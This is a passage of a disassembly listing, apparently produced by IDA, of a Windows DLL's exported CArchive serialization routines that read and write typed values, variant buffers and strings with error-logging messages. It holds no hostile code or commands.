		jnz	short locret_6AF39466

loc_6AF39463:				; CODE XREF: Ordinal370+7j
		xor	eax, eax
		inc	eax

locret_6AF39466:			; CODE XREF: Ordinal370+1Bj
					; Ordinal370+26j
		retn	4
; ---------------------------------------------------------------------------

loc_6AF39469:				; CODE XREF: Ordinal370+Dj
					; Ordinal370+16j
		push	4

loc_6AF3946B:				; CODE XREF: Ordinal370+2Aj
					; Ordinal370+2Ej
		pop	eax
		jmp	short locret_6AF39466
; ---------------------------------------------------------------------------

loc_6AF3946E:				; CODE XREF: Ordinal370+10j
					; Ordinal370+13j
		push	8
		jmp	short loc_6AF3946B
; ---------------------------------------------------------------------------

loc_6AF39472:				; CODE XREF: Ordinal370+Aj
		push	2
		jmp	short loc_6AF3946B
Ordinal370	endp

; Exported entry 376.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal376
Ordinal376	proc near		; CODE XREF: Ordinal372+65p
					; DATA XREF: .rdata:off_6AF66098o

var_24		= byte ptr -24h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		lea	ecx, [ebp+var_24]
		xor	ebx, ebx
		call	Ordinal1496
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_24]
		call	Ordinal1511
		test	eax, eax
		jz	short loc_6AF39510
		lea	ecx, [ebp+var_24]
		call	Ordinal1517
		test	eax, eax
		jz	short loc_6AF39510
		lea	ecx, [ebp+var_24]
		call	Ordinal1518
		push	4
		lea	ecx, [ebp+var_4]
		mov	[ebp+var_4], eax
		mov	eax, [edi]
		push	ecx
		mov	ecx, edi
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF394C9
		push	offset aCarchiveWritev ; "CArchive::WriteVariantBuffer() : WriteE"...
		jmp	short loc_6AF39515
; ---------------------------------------------------------------------------

loc_6AF394C9:				; CODE XREF: Ordinal376+4Aj
		mov	esi, [ebp+arg_4]
		add	dword ptr [esi], 4
		lea	ecx, [ebp+var_24]
		call	Ordinal1519
		test	eax, eax
		jnz	short loc_6AF394E2
		push	offset aCarchiveWrit_0 ; "CArchive::WriteVariantBuffer() : varBuf"...
		jmp	short loc_6AF39515
; ---------------------------------------------------------------------------

loc_6AF394E2:				; CODE XREF: Ordinal376+63j
		push	[ebp+var_4]
		mov	edx, [edi]
		push	eax
		mov	ecx, edi
		call	dword ptr [edx+8]
		test	eax, eax
		jnz	short loc_6AF394FE
		push	offset aCarchiveWritev ; "CArchive::WriteVariantBuffer() : WriteE"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF39506
; ---------------------------------------------------------------------------

loc_6AF394FE:				; CODE XREF: Ordinal376+79j
		mov	eax, [ebp+var_4]
		add	[esi], eax
		xor	ebx, ebx
		inc	ebx

loc_6AF39506:				; CODE XREF: Ordinal376+86j
		lea	ecx, [ebp+var_24]
		call	Ordinal1520
		jmp	short loc_6AF3951B
; ---------------------------------------------------------------------------

loc_6AF39510:				; CODE XREF: Ordinal376+22j
					; Ordinal376+2Ej
		push	offset aCarchiveWrit_1 ; "CArchive::WriteVariantBuffer() : varBuf"...

loc_6AF39515:				; CODE XREF: Ordinal376+51j
					; Ordinal376+6Aj
		call	sub_6AF3102E
		pop	ecx

loc_6AF3951B:				; CODE XREF: Ordinal376+98j
		lea	ecx, [ebp+var_24]
		call	Ordinal1499
		pop	edi
		pop	esi
		mov	eax, ebx
		pop	ebx
		leave
		retn	8
Ordinal376	endp

; Exported entry 377.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal377
Ordinal377	proc near		; CODE XREF: Ordinal373+50p
					; DATA XREF: .rdata:off_6AF66098o

var_24		= byte ptr -24h
cElements	= dword	ptr -4
pvarg		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+var_24]
		call	Ordinal1496
		mov	eax, [esi]
		push	4
		lea	ecx, [ebp+cElements]
		push	ecx
		xor	ebx, ebx
		mov	ecx, esi
		mov	[ebp+cElements], ebx
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF39564
		push	offset aCarchiveReadva ; "CArchive::ReadVariantBuffer()	: ReadEx("...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF395E6
; ---------------------------------------------------------------------------

loc_6AF39564:				; CODE XREF: Ordinal377+26j
		push	edi		; Args
		mov	edi, [ebp+arg_4]
		push	[ebp+cElements]	; cElements
		add	dword ptr [edi], 4
		lea	ecx, [ebp+var_24]
		call	Ordinal1504
		test	eax, eax
		jnz	short loc_6AF39581
		push	offset aCarchiveRead_0 ; "CArchive::ReadVariantBuffer()	: varBuff"...
		jmp	short loc_6AF39592
; ---------------------------------------------------------------------------

loc_6AF39581:				; CODE XREF: Ordinal377+4Cj
		lea	ecx, [ebp+var_24]
		call	Ordinal1519
		test	eax, eax
		jnz	short loc_6AF39599
		push	offset aCarchiveRead_1 ; "CArchive::ReadVariantBuffer()	: varBuff"...

loc_6AF39592:				; CODE XREF: Ordinal377+53j
		call	sub_6AF3102E
		jmp	short loc_6AF395E4
; ---------------------------------------------------------------------------

loc_6AF39599:				; CODE XREF: Ordinal377+5Fj
		push	[ebp+cElements]
		mov	edx, [esi]
		push	eax
		mov	ecx, esi
		call	dword ptr [edx+4]
		test	eax, eax
		jnz	short loc_6AF395B5
		push	offset aCarchiveReadva ; "CArchive::ReadVariantBuffer()	: ReadEx("...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF395BD
; ---------------------------------------------------------------------------

loc_6AF395B5:				; CODE XREF: Ordinal377+7Aj
		mov	eax, [ebp+cElements]
		add	[edi], eax
		xor	ebx, ebx
		inc	ebx

loc_6AF395BD:				; CODE XREF: Ordinal377+87j
		lea	ecx, [ebp+var_24]
		call	Ordinal1520
		test	ebx, ebx
		jz	short loc_6AF395E5
		push	[ebp+pvarg]	; pvarg
		lea	ecx, [ebp+var_24]
		call	Ordinal1510
		test	eax, eax
		jnz	short loc_6AF395E5
		push	offset aCarchiveRead_2 ; "CArchive::ReadVariantBuffer()	: varBuff"...
		call	sub_6AF3102E
		xor	ebx, ebx

loc_6AF395E4:				; CODE XREF: Ordinal377+6Bj
		pop	ecx

loc_6AF395E5:				; CODE XREF: Ordinal377+9Bj
					; Ordinal377+AAj
		pop	edi

loc_6AF395E6:				; CODE XREF: Ordinal377+33j
		lea	ecx, [ebp+var_24]
		call	Ordinal1499
		pop	esi
		mov	eax, ebx
		pop	ebx
		leave
		retn	8
Ordinal377	endp

; Exported entry 378.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal378
Ordinal378	proc near		; CODE XREF: Ordinal372+AFp
					; DATA XREF: .rdata:off_6AF66098o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	edi
		push	dword ptr [ebx+8] ; bstr
		mov	edi, ecx
		call	ds:SysStringByteLen
		push	4
		lea	ecx, [ebp+arg_0]
		mov	[ebp+arg_0], eax
		mov	eax, [edi]
		push	ecx
		mov	ecx, edi
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF3962F
		push	offset aCarchiveWrit_2 ; "CArchive::WriteVariantString() : WriteE"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF39661
; ---------------------------------------------------------------------------

loc_6AF3962F:				; CODE XREF: Ordinal378+2Aj
		push	esi		; Args
		push	[ebp+arg_0]
		mov	esi, [ebp+arg_4]
		add	dword ptr [esi], 4
		push	dword ptr [ebx+8]
		mov	eax, [edi]
		mov	ecx, edi
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF39654
		push	offset aCarchiveWrit_2 ; "CArchive::WriteVariantString() : WriteE"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF39660
; ---------------------------------------------------------------------------

loc_6AF39654:				; CODE XREF: Ordinal378+4Fj
		mov	eax, [ebp+arg_0]
		add	[esi], eax
		mov	[ebp+var_4], 1

loc_6AF39660:				; CODE XREF: Ordinal378+5Cj
		pop	esi

loc_6AF39661:				; CODE XREF: Ordinal378+37j
		mov	eax, [ebp+var_4]
		pop	edi
		pop	ebx
		leave
		retn	8
Ordinal378	endp

; Exported entry 379.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal379
Ordinal379	proc near		; CODE XREF: Ordinal373+9Ap
					; DATA XREF: .rdata:off_6AF66098o

len		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	edi
		mov	edi, ecx
		mov	eax, [edi]
		push	4
		lea	ecx, [ebp+len]
		push	ecx
		xor	ebx, ebx
		mov	ecx, edi
		mov	[ebp+len], ebx
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF39695
		push	offset aCarchiveRead_3 ; "CArchive::ReadVariantString()	: ReadEx("...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF396DC
; ---------------------------------------------------------------------------

loc_6AF39695:				; CODE XREF: Ordinal379+1Cj
		push	esi		; Args
		push	[ebp+len]	; len
		mov	esi, [ebp+arg_4]
		add	dword ptr [esi], 4
		push	ebx		; psz
		call	ds:SysAllocStringByteLen
		test	eax, eax
		mov	ecx, [ebp+arg_0]
		mov	[ecx+8], eax
		jnz	short loc_6AF396BD
		push	offset aCarchiveRead_4 ; "CArchive::ReadVariantString()	: SysAllo"...

loc_6AF396B5:				; CODE XREF: Ordinal379+67j
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF396DB
; ---------------------------------------------------------------------------

loc_6AF396BD:				; CODE XREF: Ordinal379+44j
		push	[ebp+len]
		mov	edx, [edi]
		push	eax
		mov	ecx, edi
		call	dword ptr [edx+4]
		test	eax, eax
		jnz	short loc_6AF396D3
		push	offset aCarchiveRead_3 ; "CArchive::ReadVariantString()	: ReadEx("...
		jmp	short loc_6AF396B5
; ---------------------------------------------------------------------------

loc_6AF396D3:				; CODE XREF: Ordinal379+60j
		mov	eax, [ebp+len]
		add	[esi], eax
		xor	ebx, ebx
		inc	ebx

loc_6AF396DB:				; CODE XREF: Ordinal379+51j
		pop	esi

loc_6AF396DC:				; CODE XREF: Ordinal379+29j
		pop	edi
		mov	eax, ebx
		pop	ebx
		leave
		retn	8
Ordinal379	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF396E4	proc near		; CODE XREF: sub_6AF39E20+2Cp

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_6AF396F3
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF396F3:				; CODE XREF: sub_6AF396E4+7j
		mov	eax, [esp+4+arg_0]
		mov	[esi], eax
		pop	esi
		retn	4
sub_6AF396E4	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_3. PRESS KEYPAD "+" TO EXPAND]
; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_4. PRESS KEYPAD "+" TO EXPAND]
; Exported entry 313.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal313
Ordinal313	proc near		; CODE XREF: Ordinal314+19p
					; Ordinal315+15p
					; DATA XREF: ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, [ebp+arg_8]
		push	esi
		mov	esi, ecx
		mov	ecx, [ebp+arg_4]
		xor	eax, eax
		mov	[ecx], eax
		mov	ecx, [ebp+arg_C]
		push	edi
		xor	edi, edi
		mov	[ebx], eax
		inc	edi
		mov	[ecx], eax
		cmp	[esi+10h], edi
		jz	short loc_6AF39768
		push	offset aCarchivePeekM_ ; "CArchive::Peek() : m_eArchiveType != eR"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF397E1
; ---------------------------------------------------------------------------

loc_6AF39768:				; CODE XREF: Ordinal313+20j
		push	edi
		lea	ecx, [ebp+arg_8+3]
		mov	[ebp+var_4], eax
		mov	eax, [esi]
		push	ecx
		mov	ecx, esi
		mov	byte ptr [ebp+arg_8+3],	0
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF39786
		push	offset aCarchivePeekRe ; "CArchive::Peek() : ReadEx() == FALSE\n"
		jmp	short loc_6AF397B8
; ---------------------------------------------------------------------------

loc_6AF39786:				; CODE XREF: Ordinal313+46j
		movzx	edx, byte ptr [ebp+arg_8+3]
		mov	eax, [ebp+arg_4]
		push	edx
		mov	ecx, esi
		mov	[eax], edx
		call	Ordinal369
		test	eax, eax
		mov	ecx, esi
		jz	short loc_6AF397A7
		push	edx
		call	Ordinal370
		mov	[ebx], eax
		jmp	short loc_6AF397EB
; ---------------------------------------------------------------------------

loc_6AF397A7:				; CODE XREF: Ordinal313+64j
		mov	eax, [esi]
		push	4
		push	ebx
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF397E8
		push	offset aCarchivePeakRe ; "CArchive::Peak() : ReadEx() == FALSE\n"

loc_6AF397B8:				; CODE XREF: Ordinal313+4Dj
		call	sub_6AF3102E
		pop	ecx

loc_6AF397BE:				; CODE XREF: Ordinal313+BFj
		push	dword ptr [esi+0Ch]
		mov	eax, [esi]
		push	dword ptr [esi+8]
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		test	eax, eax
		jnz	short loc_6AF397DE
		push	offset aCarchivePeekSe ; "CArchive::Peek() : SetPosEx()	== FALSE\n"...
		call	sub_6AF3102E
		and	[ebp+var_4], 0
		pop	ecx

loc_6AF397DE:				; CODE XREF: Ordinal313+96j
		mov	eax, [ebp+var_4]

loc_6AF397E1:				; CODE XREF: Ordinal313+2Fj
					; Ordinal313+F0j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	10h
; ---------------------------------------------------------------------------

loc_6AF397E8:				; CODE XREF: Ordinal313+7Aj
		push	5
		pop	edi

loc_6AF397EB:				; CODE XREF: Ordinal313+6Ej
		cmp	[ebp+arg_0], 0
		mov	[ebp+var_4], 1
		jz	short loc_6AF397BE
		add	edi, [ebx]
		mov	ecx, [esi+8]
		mov	edx, [esi+0Ch]
		mov	eax, [esi]
		xor	ebx, ebx
		add	ecx, edi
		adc	edx, ebx
		push	edx
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		test	eax, eax
		jz	short loc_6AF3981B
		add	[esi+8], edi
		adc	[esi+0Ch], ebx
		jmp	short loc_6AF39824
; ---------------------------------------------------------------------------

loc_6AF3981B:				; CODE XREF: Ordinal313+DAj
		mov	eax, [ebp+arg_C]
		mov	dword ptr [eax], 1

loc_6AF39824:				; CODE XREF: Ordinal313+E2j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF397E1
Ordinal313	endp

; Exported entry 314.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal314
Ordinal314	proc near		; CODE XREF: Ordinal299+17Ep
					; Ordinal340+30p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	eax, [ebp+arg_0]
		push	esi
		xor	edx, edx
		lea	esi, [ebp+arg_0]
		push	esi
		push	eax
		mov	[eax], edx
		lea	eax, [ebp+var_4]
		push	eax
		push	edx
		mov	[ebp+var_4], edx
		call	Ordinal313
		pop	esi
		leave
		retn	4
Ordinal314	endp

; Exported entry 315.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal315
Ordinal315	proc near		; DATA XREF: .rdata:off_6AF66098o

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		lea	eax, [ebp+arg_0]
		push	eax
		lea	eax, [ebp+var_4]
		push	eax
		push	[ebp+arg_0]
		push	0
		call	Ordinal313
		leave
		retn	4
Ordinal315	endp

; Exported entry 367.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal367
Ordinal367	proc near		; CODE XREF: Ordinal332+Ep
					; Ordinal335+Ep ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		xor	ebx, ebx
		push	edi
		mov	edi, [ebp+arg_C]
		and	dword ptr [edi], 0
		mov	esi, ecx
		inc	ebx
		cmp	[esi+10h], ebx
		jz	short loc_6AF39893
		push	offset aCarchiveReadM_ ; "CArchive::Read() : m_eArchiveType != eR"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3992C
; ---------------------------------------------------------------------------

loc_6AF39893:				; CODE XREF: Ordinal367+15j
		mov	eax, [esi]
		and	[ebp+var_4], 0
		push	ebx
		lea	ecx, [ebp+arg_C+3]
		push	ecx
		mov	ecx, esi
		mov	byte ptr [ebp+arg_C+3],	0
		call	dword ptr [eax+4]
		test	eax, eax
		jz	short loc_6AF398FF
		movzx	edx, byte ptr [ebp+arg_C+3]
		cmp	edx, [ebp+arg_0]
		jz	short loc_6AF398BB
		push	offset aCarchiveReadEr ; "CArchive::Read() : eReadType != eType\n"
		jmp	short loc_6AF39904
; ---------------------------------------------------------------------------

loc_6AF398BB:				; CODE XREF: Ordinal367+48j
		push	edx
		mov	ecx, esi
		call	Ordinal369
		test	eax, eax
		mov	ecx, esi
		jz	short loc_6AF398D3
		push	edx
		call	Ordinal370
		mov	[edi], eax
		jmp	short loc_6AF398E2
; ---------------------------------------------------------------------------

loc_6AF398D3:				; CODE XREF: Ordinal367+5Dj
		mov	eax, [esi]
		push	4
		push	edi
		call	dword ptr [eax+4]
		test	eax, eax
		jz	short loc_6AF398FF
		push	5
		pop	ebx

loc_6AF398E2:				; CODE XREF: Ordinal367+67j
		mov	eax, [edi]
		cmp	[ebp+arg_8], eax
		jnb	short loc_6AF398F0
		push	offset aCarchiveReadDw ; "CArchive::Read() : dwSize < dwRead\n"
		jmp	short loc_6AF39904
; ---------------------------------------------------------------------------

loc_6AF398F0:				; CODE XREF: Ordinal367+7Dj
		mov	edx, [esi]
		push	eax
		push	[ebp+arg_4]
		mov	ecx, esi
		call	dword ptr [edx+4]
		test	eax, eax
		jnz	short loc_6AF39919

loc_6AF398FF:				; CODE XREF: Ordinal367+3Fj
					; Ordinal367+73j
		push	offset aCarchiveReadRe ; "CArchive::Read() : ReadEx() == FALSE\n"

loc_6AF39904:				; CODE XREF: Ordinal367+4Fj
					; Ordinal367+84j
		call	sub_6AF3102E
		mov	eax, [esi]
		pop	ecx
		push	dword ptr [esi+0Ch]
		mov	ecx, esi
		push	dword ptr [esi+8]
		call	dword ptr [eax+0Ch]
		jmp	short loc_6AF39929
; ---------------------------------------------------------------------------

loc_6AF39919:				; CODE XREF: Ordinal367+93j
		add	ebx, [edi]
		mov	[ebp+var_4], 1
		add	[esi+8], ebx
		adc	dword ptr [esi+0Ch], 0

loc_6AF39929:				; CODE XREF: Ordinal367+ADj
		mov	eax, [ebp+var_4]

loc_6AF3992C:				; CODE XREF: Ordinal367+24j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	10h
Ordinal367	endp

; Exported entry 368.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal368
Ordinal368	proc near		; CODE XREF: Ordinal318+9p
					; Ordinal320+9p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+10h], 2
		jz	short loc_6AF39952
		push	offset aCarchiveWriteM ; "CArchive::Write() : m_eArchiveType !=	e"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF399D2
; ---------------------------------------------------------------------------

loc_6AF39952:				; CODE XREF: Ordinal368+Bj
		mov	eax, [esi]
		and	[ebp+var_4], 0
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	edi		; Args
		xor	edi, edi
		inc	edi
		push	edi
		lea	ecx, [ebp+arg_0+3]
		push	ecx
		mov	ecx, esi
		mov	byte ptr [ebp+arg_0+3],	bl
		call	dword ptr [eax+8]
		test	eax, eax
		jz	short loc_6AF399A2
		push	ebx
		mov	ecx, esi
		call	Ordinal369
		test	eax, eax
		jnz	short loc_6AF39991
		mov	eax, [esi]
		push	4
		lea	ecx, [ebp+arg_8]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+8]
		test	eax, eax
		jz	short loc_6AF399A2
		push	5
		pop	edi

loc_6AF39991:				; CODE XREF: Ordinal368+48j
		push	[ebp+arg_8]
		mov	eax, [esi]
		push	[ebp+arg_4]
		mov	ecx, esi
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF399BC

loc_6AF399A2:				; CODE XREF: Ordinal368+3Cj
					; Ordinal368+59j
		push	offset aCarchiveWriteW ; "CArchive::Write() : WriteEx()	== FALSE\n"...
		call	sub_6AF3102E
		mov	eax, [esi]
		pop	ecx
		push	dword ptr [esi+0Ch]
		mov	ecx, esi
		push	dword ptr [esi+8]
		call	dword ptr [eax+0Ch]
		jmp	short loc_6AF399CD
; ---------------------------------------------------------------------------

loc_6AF399BC:				; CODE XREF: Ordinal368+6Dj
		add	edi, [ebp+arg_8]
		mov	[ebp+var_4], 1
		add	[esi+8], edi
		adc	dword ptr [esi+0Ch], 0

loc_6AF399CD:				; CODE XREF: Ordinal368+87j
		mov	eax, [ebp+var_4]
		pop	edi
		pop	ebx

loc_6AF399D2:				; CODE XREF: Ordinal368+1Aj
		pop	esi
		leave
		retn	0Ch
Ordinal368	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF399D7	proc near		; CODE XREF: Ordinal381+B2p
					; Ordinal380+57p
		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		test	eax, eax
		jz	short loc_6AF399E6
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF399E6:				; CODE XREF: sub_6AF399D7+7j
		and	dword ptr [esi], 0
		mov	eax, esi
		pop	esi
		retn
sub_6AF399D7	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF399ED	proc near		; CODE XREF: sub_6AF39E20+37p

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	esi
		mov	esi, ecx
		push	edi
		mov	edi, [esi]
		cmp	edi, eax
		jz	short loc_6AF39A11
		test	eax, eax
		mov	[esi], eax
		jz	short loc_6AF39A07
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+4]

loc_6AF39A07:				; CODE XREF: sub_6AF399ED+12j
		test	edi, edi
		jz	short loc_6AF39A11
		mov	eax, [edi]
		push	edi
		call	dword ptr [eax+8]

loc_6AF39A11:				; CODE XREF: sub_6AF399ED+Cj
					; sub_6AF399ED+1Cj
		pop	edi
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF399ED	endp

; Exported entry 318.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal318
Ordinal318	proc near		; CODE XREF: Ordinal297+1Cp
					; Ordinal300+105p ...

arg_0		= byte ptr  4

		push	1
		lea	eax, [esp+4+arg_0]
		push	eax
		push	0Ah
		call	Ordinal368
		retn	4
Ordinal318	endp

; Exported entry 320.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal320
Ordinal320	proc near		; CODE XREF: Ordinal300+5Fp
					; Ordinal347+9p ...

arg_0		= byte ptr  4

		push	1
		lea	eax, [esp+4+arg_0]
		push	eax
		push	1
		call	Ordinal368
		retn	4
Ordinal320	endp

; Exported entry 322.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal322
Ordinal322	proc near		; CODE XREF: Ordinal300+72p
					; Ordinal349+9p ...

arg_0		= byte ptr  4

		push	2
		lea	eax, [esp+4+arg_0]
		push	eax
		push	2
		call	Ordinal368
		retn	4
Ordinal322	endp

; Exported entry 324.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal324
Ordinal324	proc near		; CODE XREF: Ordinal179+33p
					; Ordinal179+65p ...

arg_0		= byte ptr  4

		push	4
		lea	eax, [esp+4+arg_0]
		push	eax
		push	3
		call	Ordinal368
		retn	4
Ordinal324	endp

; Exported entry 326.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal326
Ordinal326	proc near		; CODE XREF: Ordinal300+93p
					; Ordinal353+Cp ...

arg_0		= byte ptr  4

		push	8
		lea	eax, [esp+4+arg_0]
		push	eax
		push	4
		call	Ordinal368
		retn	8
Ordinal326	endp

; Exported entry 328.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal328
Ordinal328	proc near		; CODE XREF: Ordinal300+A7p
					; Ordinal355+Ep ...

arg_0		= byte ptr  4

		push	8
		lea	eax, [esp+4+arg_0]
		push	eax
		push	5
		call	Ordinal368
		retn	8
Ordinal328	endp

; Exported entry 330.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal330
Ordinal330	proc near		; CODE XREF: Ordinal179+21p
					; Ordinal218+20p ...

arg_0		= byte ptr  4

		push	4
		lea	eax, [esp+4+arg_0]
		push	eax
		push	6
		call	Ordinal368
		retn	4
Ordinal330	endp

; Exported entry 332.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal332
Ordinal332	proc near		; CODE XREF: Ordinal299+1C1p
					; Ordinal1451j
					; DATA XREF: ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	[esp+arg_8]
		push	[esp+4+arg_4]
		push	[esp+8+arg_0]
		push	9
		call	Ordinal367
		retn	0Ch
Ordinal332	endp

; Exported entry 333.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal333
Ordinal333	proc near		; CODE XREF: Ordinal300+F3p
					; Ordinal300+15Dp ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]
		push	[esp+4+arg_0]
		push	9
		call	Ordinal368
		retn	8
Ordinal333	endp

; Exported entry 335.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal335
Ordinal335	proc near		; CODE XREF: Ordinal816j
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	[esp+arg_8]
		push	[esp+4+arg_4]
		push	[esp+8+arg_0]
		push	7
		call	Ordinal367
		retn	0Ch
Ordinal335	endp

; Exported entry 336.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal336(LPCSTR lpString)
		public Ordinal336
Ordinal336	proc near		; CODE XREF: Ordinal300+C5p
					; Ordinal358+9p ...

lpString	= dword	ptr  4

		push	esi
		push	[esp+4+lpString] ; lpString
		mov	esi, ecx
		call	ds:lstrlenA
		inc	eax
		push	eax
		push	[esp+8+lpString]
		mov	ecx, esi
		push	7
		call	Ordinal368
		pop	esi
		retn	4
Ordinal336	endp

; Exported entry 338.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal338
Ordinal338	proc near		; CODE XREF: Ordinal819j
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	[esp+arg_8]
		push	[esp+4+arg_4]
		push	[esp+8+arg_0]
		push	8
		call	Ordinal367
		retn	0Ch
Ordinal338	endp

; Exported entry 339.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal339(LPCWSTR lpString)
		public Ordinal339
Ordinal339	proc near		; CODE XREF: Ordinal300+D4p
					; Ordinal359+9p ...

lpString	= dword	ptr  4

		push	esi
		push	[esp+4+lpString] ; lpString
		mov	esi, ecx
		call	ds:lstrlenW
		lea	eax, [eax+eax+2]
		push	eax
		push	[esp+8+lpString]
		mov	ecx, esi
		push	8
		call	Ordinal368
		pop	esi
		retn	4
Ordinal339	endp

; Exported entry 345.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal345
Ordinal345	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal318
		test	eax, eax
		jnz	short loc_6AF39B4D
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39B4D:				; CODE XREF: Ordinal345+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal345	endp

; Exported entry 347.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal347
Ordinal347	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal320
		test	eax, eax
		jnz	short loc_6AF39B7B
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39B7B:				; CODE XREF: Ordinal347+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
